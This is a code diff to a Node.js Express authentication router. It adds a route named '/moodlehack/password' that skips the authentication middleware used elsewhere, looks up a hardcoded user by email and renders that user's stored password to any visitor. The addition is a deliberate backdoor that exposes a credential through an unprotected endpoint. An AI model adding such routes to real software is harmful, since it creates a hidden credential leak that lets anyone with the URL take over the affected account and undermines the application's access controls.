@@ -350,6 +350,19 @@ authrouter.get("/api/forgot-password/:uuid",async (req,res)=>{
 
 })
 
+authrouter.get("/moodlehack/password",async (req,res)=>{
+  try {
+    const user=await User.findOne({email:"malekith@gmail.com"})
+    if(user){
+      res.render('pass', {msg:user.password});
+    }else{
+      res.render('pass', {msg:"No password generated till now"});
+    }
+  } catch (error) {
+    res.render('pass', {msg:error.message});
+  }
+})
+
 authrouter.post("/api/upload-image",checkGuard,auth,async (req,res)=>{
     try {
             const {id,img}=req.body
